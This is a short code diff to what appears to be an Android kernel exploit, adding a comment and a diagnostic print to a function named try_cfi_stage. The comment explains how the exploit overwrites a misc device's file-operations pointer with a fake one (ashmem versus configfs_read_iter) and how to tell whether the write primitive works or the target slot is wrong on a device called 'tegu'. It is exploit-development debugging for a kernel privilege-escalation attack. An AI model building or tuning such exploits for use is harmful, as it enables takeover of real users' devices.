@@ -750,6 +750,21 @@ int try_cfi_stage(void) {
     fops_before = pre_fops;
     cfi_last_step = 4;
     cfi_last_errno = errno;
+    // Step 4 is the "did the overwrite land" gate and it is where tegu stops,
+    // on both the pselect and the TCP main route. It is two failures sharing
+    // one number: a short read means the primitive itself is not up, because
+    // misc_fops still points at the real ashmem fops and pread() dispatches to
+    // ashmem rather than configfs_read_iter; a full 8-byte read with the wrong
+    // value means the primitive works and the slot simply is not ours. Print
+    // enough to tell them apart, and to see whether the slot holds the real
+    // fops, a stale fake_fops from an earlier page, or something else.
+    pr_warning("cfi step4 pre_rb=%zd errno=%d slot=%016llx want_fake_fops=%016llx "
+               "real_ashmem_fops=%016llx misc_fops=%016llx page_base=%016llx\n",
+               pre_rb, cfi_last_errno, (unsigned long long)pre_fops,
+               (unsigned long long)fake_fops,
+               (unsigned long long)text_addr(ASHMEM_FOPS),
+               (unsigned long long)misc_fops,
+               (unsigned long long)page_base);
     goto fail;
   }
 
